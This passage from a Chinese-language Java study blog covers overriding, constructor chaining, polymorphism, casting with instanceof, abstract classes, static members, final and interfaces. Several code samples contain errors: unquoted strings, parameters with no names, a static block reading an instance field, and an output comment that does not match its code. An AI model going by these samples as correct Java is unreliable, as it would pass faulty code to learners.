class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        d.setName(汪汪);</span><br><span class="line">        d.setHealth(<span class="number">10</span>);</span><br><span class="line">        d.setLove(<span class="number">5</span>);</span><br><span class="line">        d.strain=<span class="string">&quot;修狗&quot;</span></span><br><span class="line">        d.show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果父类里strain也是private 也需要setStrain()</p><blockquote><p>方法重写的时候 访问权限可以放大 不能减小</p><p>返回值类型可以和父类一样，也可以是父类返回值类型的子类</p><p>方法名要一样</p><p>参数列表也必须相同</p><p>父类的私有的东西是不能被重写的</p></blockquote><p> <img src="https://bu.dusays.com/2024/05/13/6641a4b1cd1b5.png" alt="image-20240417161050813"></p><h3 id="继承中的对象创建"><a href="#继承中的对象创建" class="headerlink" title="继承中的对象创建"></a>继承中的对象创建</h3><p>在具有继承关系的对象创建中，构建子类对象会先调用父类构造</p><p>由父类的共性类容，叠加子类的独有内容，组合成完整的子类对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4ac09888.png" alt="image-20240417162049626"></p><p>只会调用父类的构造方法 而不会去创建父类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exercise</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        C c=<span class="keyword">new</span> <span class="title class_">C</span>(<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>);</span><br><span class="line">        System.out.println(c.a+<span class="string">&quot;--&quot;</span>+c.b+<span class="string">&quot;--&quot;</span>+c.c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">A</span><span class="params">(<span class="type">int</span> a)</span>&#123;<span class="comment">//带参构造</span></span><br><span class="line">        <span class="built_in">this</span>.a=a;</span><br><span class="line">        System.out.println(<span class="string">&quot;A(int)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">B</span><span class="params">(<span class="type">int</span> b,<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(a);</span><br><span class="line">        <span class="built_in">this</span>.b=b;</span><br><span class="line">        System.out.println(<span class="string">&quot;B(int,int)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span> <span class="keyword">extends</span> <span class="title class_">B</span>&#123;</span><br><span class="line">    <span class="type">int</span> c=<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">C</span><span class="params">(<span class="type">int</span> c,<span class="type">int</span> b,<span class="type">int</span> a)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(a,b);</span><br><span class="line">        <span class="built_in">this</span>.c=c;</span><br><span class="line">        System.out.println(<span class="string">&quot;C(int,int,int)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>super()  表示调用父类无参构造</p><p>super(实参)   表示调用父类带参构造</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4b58af33.png" alt="image-20240417163817844"></p><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><h3 id="概念-2"><a href="#概念-2" class="headerlink" title="概念"></a>概念</h3><p>多态&#x3D;继承+重写</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b79aa41.png" alt="image-20240417165136599"></p><p>多态表现形式：调用父类的方法，执行子类的方法</p><p>这里是<strong>向上转型</strong></p><h3 id="多态的应用"><a href="#多态的应用" class="headerlink" title="多态的应用"></a>多态的应用</h3><p><strong>1.使用父类作为方法形参实现多态，使方法参数的类型更为宽泛</strong></p><p>代码与前面的相结合一下 这里只写重点代码了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(Pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>2.使用父类作为方法返回值实现多态，使方法可以返回不同子类对象</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">getPet</span><span class="params">(String type)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(type.equals(<span class="string">&quot;cat&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> m.getPet(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="向下转型-拆箱"><a href="#向下转型-拆箱" class="headerlink" title="向下转型(拆箱)"></a>向下转型(拆箱)</h3><blockquote><p>一个对象在调用方法的时候，能调用到哪些方法取决于对象的类型</p><p>执行方法的时候，执行哪个方法取决于实际类型</p></blockquote><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">(Pet pet)</span>&#123;</span><br><span class="line">        Dog dog=(Dog)pet;</span><br><span class="line">        dog.catchDisk();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">getPet</span><span class="params">(String type)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(type.equals(<span class="string">&quot;cat&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> m.getPet(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">        m.play(Pet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Dog dog&#x3D;(Dog)pet;</p><p>将父类引用中的子类对象，强制转回子类本身类型，称为<strong>向下转型</strong></p><p><strong>只要转回子类真实类型，才可调用子类独有的属性和方法</strong></p><p>向下转型时，如果父类引用中的子类对象类型和目标类型不匹配，则会发生类型转换异常（classCastException）</p><p>解决：</p><p>判断传来的是什么</p><p><strong>instanceof</strong>关键字</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">character</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">feed</span><span class="params">(pet)</span>&#123;</span><br><span class="line">        pet.eat();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">play</span><span class="params">(Pet pet)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(pet <span class="keyword">instanceof</span> Dog)&#123;</span><br><span class="line">            Dog dog=(Dog)pet;</span><br><span class="line">            dog.catchDisk();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">Penguin</span> <span class="variable">p</span> <span class="operator">=</span>(Penguin) pet;</span><br><span class="line">            p.swim();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">getPet</span><span class="params">(String type)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(type.equals(<span class="string">&quot;cat&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Penguin</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">character</span> <span class="variable">m</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">character</span>();</span><br><span class="line">        <span class="type">Pet</span> <span class="variable">pet</span> <span class="operator">=</span> m.getPet(<span class="string">&quot;Dog&quot;</span>);</span><br><span class="line">        m.feed(<span class="keyword">new</span> <span class="title class_">Dog</span>());</span><br><span class="line">        m.play(Pet);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>向下转型前，应先判断引用中对象真实类型，保证类型转换的正确性</p><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><h3 id="abstract"><a href="#abstract" class="headerlink" title="abstract"></a>abstract</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>abstract 抽象</p><p>这是上面写的Pet类 并加上了abstract</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot; is eating&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为这个Pet是一个抽象出来的类 所以它不能被实例化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Pet pet=new Pet();  //这样不行 只能new Dog()这种</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b8206ba.png" alt="image-20240421195056419"></p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>那抽象类的作用是什么呢</p><blockquote><p>1.可被子类继承</p><p>2.可声明为引用</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4b83f4d4.png" alt="image-20240421195716373"></p><h4 id="抽象方法"><a href="#抽象方法" class="headerlink" title="抽象方法"></a>抽象方法</h4><p>在抽象类中 只用声明这个方法就行 具体实现在子类中(必须 若这个子类不是抽象的化 抽象的化就会让子类的子类来实现)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Pet</span>&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="type">int</span> health;</span><br><span class="line">    <span class="type">int</span> love;<span class="comment">//亲密度</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">eat</span><span class="params">()</span>；<span class="comment">//将eat方法抽象</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(name+<span class="string">&quot;-&quot;</span>+health+<span class="string">&quot;-&quot;</span>+love);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getHealth</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHealth</span><span class="params">(<span class="type">int</span> health)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.health=health;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLove</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLove</span><span class="params">(<span class="type">int</span> love)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.love=love;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>抽象方法必须放在抽象类中(或接口中)</strong></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b8612e7.png" alt="image-20240421200629629"></p><h3 id="static"><a href="#static" class="headerlink" title="static"></a>static</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>静态</p><p><strong>实例属性：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc1.a = <span class="number">10</span>;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc2.a = <span class="number">20</span>;</span><br><span class="line">      System.out.println(mc1.a+<span class="string">&quot;---&quot;</span>+mc2.a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//10---20</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7d302e.png" alt="image-20240421201723788"></p><p><strong>静态属性：</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> a;<span class="comment">//这里将a变为静态属性</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc1.a = <span class="number">100</span>;</span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">      mc2.a = <span class="number">200</span>;</span><br><span class="line">      System.out.println(mc1.a+<span class="string">&quot;---&quot;</span>+mc2.a);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//20---20</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7f31fa.png" alt="image-20240421202112564"></p><p>注意 这里用<code>mc1.b</code>来调用实际上警告了的(java中) 因为b实际上是在类中 该用<code>Myclass.b</code>来调用</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b394ed2.png" alt="image-20240421202445371"></p><p>这里可以通过静态变量来统计类对象被创建了多少词</p><h4 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M1&quot;</span>);</span><br><span class="line">        m2();<span class="comment">//静态方法之间可以直接调用</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Myclass</span>().m3();<span class="comment">//非静态方法要实例化对象调用</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m3</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//      Myclass mc1 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc1.a = 10;</span></span><br><span class="line"><span class="comment">//      Myclass mc2 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc2.a = 20;</span></span><br><span class="line"><span class="comment">//      System.out.println(mc1.a+&quot;---&quot;+mc2.a);</span></span><br><span class="line">      Myclass.m1();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//m1 m2 m3</span></span><br></pre></td></tr></table></figure><p>在静态方法中不能用this super</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4af96103.png" alt="image-20240421203443385"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b2c3f69.png" alt="image-20240421203603070"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M1&quot;</span>);</span><br><span class="line">        m2();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">m3</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;M2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//      Myclass mc1 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc1.a = 10;</span></span><br><span class="line"><span class="comment">//      Myclass mc2 = new Myclass();</span></span><br><span class="line"><span class="comment">//      mc2.a = 20;</span></span><br><span class="line"><span class="comment">//      System.out.println(mc1.a+&quot;---&quot;+mc2.a);</span></span><br><span class="line"><span class="comment">//      Myclass.m1();</span></span><br><span class="line">      <span class="type">Myclass</span> <span class="variable">mc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubClass</span>();</span><br><span class="line">      mc.m1();</span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      如果这里是</span></span><br><span class="line"><span class="comment">      SubClass mc = new SubClass();</span></span><br><span class="line"><span class="comment">      mc.m1();</span></span><br><span class="line"><span class="comment">      结果：sub-m1   隐藏 不重写</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      SubClass.m1();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubClass</span> <span class="keyword">extends</span> <span class="title class_">Myclass</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;sub-m1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        没有这里方法的时候会输出：</span></span><br><span class="line"><span class="comment">        m1 m2 m3</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//sub-m1(SubClass.m1();)</span></span><br><span class="line"><span class="comment">//m1 m2 m3(mc.m1();)</span></span><br></pre></td></tr></table></figure><h4 id="类加载"><a href="#类加载" class="headerlink" title="类加载"></a>类加载</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4b555f6d.png" alt="image-20240421204829368"></p><p>反射时会主动加载</p><h4 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h4><p>静态代码块会优先于类 构造方法之类的先执行 一般用于初始化</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myclass</span> &#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">888</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        System.out.println(<span class="string">&quot;static block&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Text</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="keyword">new</span> <span class="title class_">Myclass</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//888</span></span><br><span class="line"><span class="comment">//static block</span></span><br><span class="line"><span class="comment">//先加载静态属性 再加载静态代码块 new多次也只会执行一次(已经加载了)</span></span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a4b85d6d0.png" alt="image-20240421205735924"></p><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><h4 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h4><p><img src="https://bu.dusays.com/2024/05/13/6641a4ae92422.png" alt="image-20240421210000010"></p><blockquote><p>final修饰类：此类不能被继承</p><p>final修饰方法：此方法不能被覆盖</p><p>final修饰变量：此变量不能被改变(常量)</p></blockquote><p><img src="https://bu.dusays.com/2024/05/13/6641a4b695b02.png" alt="image-20240421210720496"></p><p>普通常量：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b818685.png" alt="image-20240421210752719"></p><p>静态常量：</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b7a42de.png" alt="image-20240421210904529"></p><p>对象常量：</p><p>常量是一个对象</p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b6ce233.png" alt="image-20240421211244107"></p><p><img src="https://bu.dusays.com/2024/05/13/6641a4b5eaf84.png" alt="image-20240421211307746"></p><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><p>接口相当于特殊的抽象类，定义方法、组成部分与抽象类类似</p><p>interface</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD=<span class="string">&quot;value&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">m2</span><span class="params">()</span>;<span class="comment">//默认public abstract</span></span><br><span class="line">    <span class="type">double</span> VERSION=<span class="number">1.0</span>;<span class="comment">//默认public static final</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>jdk8以前：</p><p>接口中只能写：</p><blockquote><p>1.公开静态常量</p><p>2.公开抽象方法</p></blockquote><p>接口的使用：</p><p>接口相当于一个抽象父类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyInterface</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String FIELD=<span class="string">&quot;value&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">m1</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> 